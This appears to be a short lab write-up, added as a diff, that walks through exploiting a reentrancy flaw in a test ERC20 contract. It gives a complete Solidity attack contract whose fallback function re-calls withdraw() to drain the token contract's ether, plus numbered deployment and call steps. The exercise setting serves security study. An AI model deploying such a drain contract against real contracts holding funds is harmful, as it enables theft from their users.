@@ -1,0 +1,34 @@
+1. Deploy the given ERC20.sol as is with a msg.value of 5000000000000000 Wei
+2. Write a smart contract that will attack the original contract as such:
+
+pragma solidity ^0.5.0;
+import "03_ERC20.sol";
+
+contract Attack {
+    TestToken public testToken;
+    address public tokenAddress;
+
+    constructor(address payable _tokenAddress) public {
+        tokenAddress = _tokenAddress;
+        testToken = TestToken(_tokenAddress);
+    }
+
+    function() external payable {
+        if (tokenAddress.balance > msg.value) {
+            testToken.withdraw(msg.value);
+        }
+    }
+
+    function attack() external payable {
+        tokenAddress.call.value(msg.value)(
+            abi.encodeWithSignature("deposit()")
+        );
+        testToken.withdraw(msg.value);
+    }
+}
+
+3. Compile this attack contract with the originally deployed smart contract address passed in
+4. Then we call the attack function with a msg.value of something like 2000000000000000 Wei.
+5. In our attack contract we essentially first deposit money into the ERC20 contract and then call the withdraw() function which is vulnerable because it doesn't update the user balance until the end.
+6. Once our attack function calls the ERC20's withdraw function it sends money to our Attack contract
+7. Since there is no function to handle this specifically it calls the fallback() function which calls the ERC20's withdraw function again and the process repeats recursively until the msg.value is > the amount of money in the ERC20 contract.
